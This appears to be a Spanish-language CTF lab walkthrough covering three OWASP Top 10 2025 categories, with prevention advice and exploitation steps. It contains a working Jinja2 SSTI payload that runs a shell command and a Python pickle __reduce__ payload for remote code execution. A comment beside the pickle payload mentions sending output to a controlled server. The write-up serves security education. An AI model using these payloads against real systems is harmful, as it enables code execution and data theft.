# OWASP Top 10 2025: Insecure Data Handling

Esta room cubre tres categorías del OWASP Top 10 (2025) relacionadas con el manejo inseguro de datos: fallos criptográficos, inyecciones y problemas de integridad de datos/software.

## Task 1: Introduction (Introducción)

El manejo inseguro de datos es una de las causas raíz más comunes de vulnerabilidades críticas. Esta room se enfoca en cómo las aplicaciones procesan, almacenan y confían en los datos de manera incorrecta.
Categorías cubiertas:
1.  **A04: Cryptographic Failures** (Fallos Criptográficos).
2.  **A05: Injection** (Inyección).
3.  **A08: Software or Data Integrity Failures** (Fallos de Integridad de Software o Datos).

## Task 2: A04: Cryptographic Failures

Ocurre cuando los datos sensibles no están protegidos adecuadamente (falta de cifrado, algoritmos débiles, gestión de claves pobre).
*Nota: Esta categoría también se menciona en la room de "Design Flaws", pero aquí se enfoca más en la implementación y el manejo de datos.*

**Problemas Comunes:**
- Almacenar contraseñas en texto plano o con hashes débiles (MD5, SHA1).
- "Rolling your own crypto": Crear algoritmos de cifrado propios en lugar de usar estándares probados.
- Exponer claves de cifrado en el código.

**Prevención:**
- Usar algoritmos modernos (AES, RSA, etc.) y funciones de hash robustas (bcrypt, Argon2).
- Gestión segura de secretos (Key Management Systems).

**Desafío Práctico (Note Sharing App):**
- **Objetivo:** Descifrar notas protegidas por una clave débil.
- **Escenario:** Una aplicación usa una clave derivada compartida y débil.
- **Explotación:** Se puede realizar un ataque de fuerza bruta sobre la clave (por ejemplo, usando Burp Suite) para encontrar la correcta (`KEY1`) y descifrar la nota.
- **Flag:** `THM{WEAK_CRYPTO_FLAG}`.

## Task 3: A05: Injection

La inyección ocurre cuando una aplicación toma datos no confiables del usuario y los envía a un intérprete (base de datos, shell, etc.) como parte de un comando o consulta.

**Tipos Comunes:**
- SQL Injection (SQLi).
- Command Injection.
- Server-Side Template Injection (SSTI).

**Prevención:**
- Tratar todo input de usuario como no confiable.
- Usar consultas parametrizadas (Prepared Statements) para SQL.
- Evitar funciones que ejecuten comandos del sistema operativo directamente.
- Validación y sanitización estricta de entradas.

**Desafío Práctico (SSTI):**
- **Objetivo:** Realizar un ataque SSTI para leer el archivo `flag.txt`.
- **Escenario:** La aplicación renderiza contenido dinámico basado en el input del usuario sin sanitizar, permitiendo inyectar código de plantilla que se ejecuta en el servidor.
- **Explotación:** Inyectar un payload de SSTI (dependiendo del motor de plantillas, e.g., Jinja2 `{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}`) para leer el sistema de archivos.
- **Flag:** `THM{SSTI_FLAG_OBTAINED}`.

## Task 4: A08: Software or Data Integrity Failures

Ocurre cuando una aplicación confía en código, actualizaciones o datos sin verificar su integridad o autenticidad. Esto incluye la deserialización insegura, donde objetos de datos manipulados pueden llevar a la ejecución de código.

**Problemas Comunes:**
- Actualizaciones de software sin firmar.
- **Insecure Deserialization:** Aceptar objetos serializados (e.g., Python pickle, Java serialization) de usuarios no confiables.
- CI/CD pipelines inseguros.

**Prevención:**
- Verificar firmas digitales de actualizaciones.
- No deserializar datos de fuentes no confiables.
- Usar mecanismos de integridad (checksums, firmas).

**Desafío Práctico (Deserialization Attack):**
- **Objetivo:** Generar un payload malicioso serializado (pickle) en Python para leer `flag.txt`.
- **Escenario:** La aplicación acepta datos serializados en Python (pickle) y los deserializa automáticamente.
- **Explotación:** Crear un script en Python que defina una clase con el método `__reduce__` para ejecutar comandos del sistema (RCE) al ser deserializada.
    ```python
    import pickle
    import os
    import base64

    class Payload:
        def __reduce__(self):
            return (os.system, ("cat flag.txt",)) # O enviar el output a un servidor controlado

    # Serializar y enviar
    ```
- **Flag:** (Se obtiene al enviar el payload generado).
